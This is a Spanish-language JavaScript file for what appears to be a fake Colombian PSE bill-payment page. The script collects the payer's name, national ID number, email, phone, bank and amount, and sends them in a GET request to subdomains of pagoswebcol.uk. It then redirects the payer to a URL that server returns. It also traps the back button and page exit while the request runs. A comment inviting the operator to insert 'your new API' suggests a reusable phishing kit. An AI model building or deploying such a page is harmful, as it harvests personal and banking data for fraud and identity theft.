let isTransactionActive = false;
const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

window.addEventListener('beforeunload', (e) => {
    if (isTransactionActive) {
        e.preventDefault();
        e.preventDefault();
        e.returnValue = 'Por favor espere la carga';
        return 'Por favor espere la carga';
    }
});

window.addEventListener('popstate', (e) => {
    if (isTransactionActive) {
        history.pushState(null, null, window.location.href);
        alert("Por favor espere la carga");
    }
});

document.addEventListener('DOMContentLoaded', () => {
    const data = JSON.parse(localStorage.getItem('datosFactura')) || {};

    if (document.getElementById('lblNombre') && data.nombreCompleto) document.getElementById('lblNombre').textContent = enmascararNombre(data.nombreCompleto);
    if (document.getElementById('lblId') && data.numId) document.getElementById('lblId').textContent = "CC - " + enmascararID(data.numId);
    if (document.getElementById('lblCorreo') && data.correo) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
    if (document.getElementById('lblRef') && data.referencia) document.getElementById('lblRef').textContent = data.referencia;

    if (document.getElementById('formCorreo')) document.getElementById('formCorreo').value = data.correo || "";
    if (document.getElementById('formNumId')) document.getElementById('formNumId').value = data.numId || "";
    if (document.getElementById('formNombre')) document.getElementById('formNombre').value = data.nombreCompleto || "";
    if (document.getElementById('formCelular')) document.getElementById('formCelular').value = data.celular || "";

    const monto = data.montoPagar || 0;
    const valorFormateado = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(monto);

    if(document.getElementById('lblValorNeto')) document.getElementById('lblValorNeto').textContent = valorFormateado;
    if(document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorFormateado;
    if(document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorFormateado;

    setupModalCorreo(data);
});

const botonPagar = document.querySelector('.btn-pay');
if (botonPagar) {
    botonPagar.addEventListener('click', async function() {
        const bancoSelect = document.getElementById('selectBanco');
        const emailInput  = document.getElementById('formCorreo');
        const docInput    = document.getElementById('formNumId');
        const nameInput   = document.getElementById('formNombre');
        const phoneInput  = document.getElementById('formCelular');

        const banco = bancoSelect ? bancoSelect.value : "";
        const email = emailInput ? emailInput.value.trim() : "";
        const doc   = docInput ? docInput.value.trim() : "";
        const name  = nameInput ? nameInput.value.trim() : "";
        const phone = phoneInput ? phoneInput.value.trim() : "";
        
        const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
        const amount = data.montoPagar || 0; 

        if (!banco || banco.includes("Seleccione")) { alert("Seleccione su banco."); return; }
        if (!emailRegexValido.test(email)) { alert("Correo inválido."); return; }
        if (!doc || doc.length < 5) { alert("Cédula inválida."); return; }
        if (!name || name.length < 3) { alert("Nombre inválido."); return; }
        if (!phone || phone.length < 7) { alert("Celular inválido."); return; }

        isTransactionActive = true; 
        const overlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('dynamicLoadingText');
        
        if (overlay) overlay.style.display = 'flex';
        let loadingInterval = animateLoadingText(loadingText);

        // Si el banco es Nequi, usa la otra API. De lo contrario, usa la normal.
        const baseUrl = (banco === 'NEQUI') 
            ? 'https://rusianenel.pagoswebcol.uk' // <-- PON TU NUEVA API AQUÍ
            : 'https://apifinacjs.pagoswebcol.uk';
        const params = new URLSearchParams({
            amount: amount, bank: banco, email: email, doc: doc, fullName: name, phone: phone, ref: data.referencia
        });

        try {
            const response = await fetch(`${baseUrl}/meter?${params.toString()}`);
            const textResult = await response.text();
            
            if (!response.ok) throw new Error(`Error ${response.status}`);
            const result = JSON.parse(textResult);

            if (result.ok && result.result && result.result.exactName) {
                if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
                clearInterval(loadingInterval);
                setTimeout(() => {
                    isTransactionActive = false;
                    window.location.href = result.result.exactName;
                }, 1500);
            } else {
                throw new Error(result.error || "Error al obtener URL de pago.");
            }
        } catch (error) {
            clearInterval(loadingInterval);
            isTransactionActive = false;
            if (overlay) overlay.style.display = 'none';
            alert("No se pudo iniciar la transacción: " + error.message);
        }
    });
}

function setupModalCorreo(data) {
    const modal = document.getElementById('modalCorreo');
    const btnOpen = document.getElementById('btnCambiarCorreo');
    const btnCancel = document.getElementById('btnCancelarModal');
    const btnSave = document.getElementById('btnGuardarModal');
    const inputCorreo = document.getElementById('inputNuevoCorreo');

    if(btnOpen && modal) {
        btnOpen.addEventListener('click', () => { modal.style.display = 'flex'; });
        if(btnCancel) btnCancel.addEventListener('click', () => modal.style.display = 'none');
        if(btnSave) btnSave.addEventListener('click', () => {
            const nuevoCorreo = inputCorreo.value.trim();
            if (emailRegexValido.test(nuevoCorreo)) {
                data.correo = nuevoCorreo;
                localStorage.setItem('datosFactura', JSON.stringify(data));
                if(document.getElementById('lblCorreo')) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
                if(document.getElementById('formCorreo')) document.getElementById('formCorreo').value = data.correo;
                modal.style.display = 'none';
            } else {
                alert("Correo inválido");
            }
        });
    }
}

function animateLoadingText(element) {
    if (!element) return null;
    const messages = ["Conectando con la pasarela...", "Validando datos...", "Contactando banco..."];
    let i = 0;
    return setInterval(() => { i = (i + 1) % messages.length; element.textContent = messages[i]; }, 2500);
}

function enmascararNombre(nombre) { return nombre ? nombre.split(" ")[0] + " *******" : ""; }
function enmascararID(id) { return id ? id.substring(0, 3) + "****" : ""; }
function enmascararCorreo(email) {
    if(!email) return "";
    const [user] = email.split("@");
    return user.substring(0, 2) + "*******@*****.com";
}
